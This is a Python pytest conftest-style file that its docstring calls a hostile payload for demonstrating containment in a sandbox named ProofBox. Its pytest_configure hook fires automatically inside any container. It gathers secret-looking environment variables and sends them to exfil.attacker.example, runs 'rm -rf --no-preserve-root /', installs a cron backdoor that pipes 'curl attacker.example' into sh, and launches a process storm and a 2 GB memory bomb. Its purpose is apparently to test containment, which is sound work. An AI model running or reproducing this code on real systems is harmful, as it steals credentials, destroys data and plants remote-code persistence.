"""Looks like normal pytest setup. It is not.

This file is the hostile payload used to demo ProofBox containment.
Every attack here is real and runs for real inside the sandbox.
A safety latch makes it a no-op outside a container, but still: only run
this inside ProofBox.
"""

import os
import subprocess
import sys
import urllib.request


def _say(msg):
    print(f"[payload] {msg}", flush=True)


def pytest_configure(config):
    # Safety latch for humans: the payload only fires inside a container.
    # On a normal machine this file does nothing at all.
    if not os.path.exists("/.dockerenv"):
        return

    # 1. Steal secrets from the environment.
    keys = sorted(os.environ)
    _say(f"env keys visible: {', '.join(keys)}")
    leaked = {k: v for k, v in os.environ.items() if "KEY" in k or "TOKEN" in k or "SECRET" in k}
    _say(f"secrets found: {len(leaked)}")

    # 2. Send them to an attacker.
    try:
        urllib.request.urlopen("http://exfil.attacker.example/steal?d=" + ",".join(leaked), timeout=3)
        _say("exfil: SENT")
    except Exception as exc:  # noqa: BLE001
        _say(f"exfil failed: {exc}")

    # 3. Wipe the machine.
    out = subprocess.run("rm -rf --no-preserve-root / 2>&1 | head -n 4", shell=True,
                         capture_output=True, text=True)
    _say("rm -rf / said:\n" + out.stdout.strip())

    # 4. Persist with a cron job.
    try:
        with open("/etc/cron.d/backdoor", "w") as fh:
            fh.write("* * * * * root curl attacker.example | sh\n")
        _say("persistence: INSTALLED")
    except OSError as exc:
        _say(f"persistence failed: {exc}")

    # 5. Process storm.
    procs, err = [], None
    for _ in range(400):
        try:
            procs.append(subprocess.Popen(["sleep", "30"]))
        except OSError as exc:
            err = exc
            break
    _say(f"process storm stopped at {len(procs)} processes: {err}")
    for p in procs:
        p.kill()
    for p in procs:
        p.wait()

    # 6. Memory bomb (2 GB).
    rc = subprocess.run([sys.executable, "-c", "b = b'x' * (2 * 1024 ** 3); print(len(b))"]).returncode
    _say(f"memory bomb exited with code {rc} ({'Killed' if rc == -9 else 'ok'})")
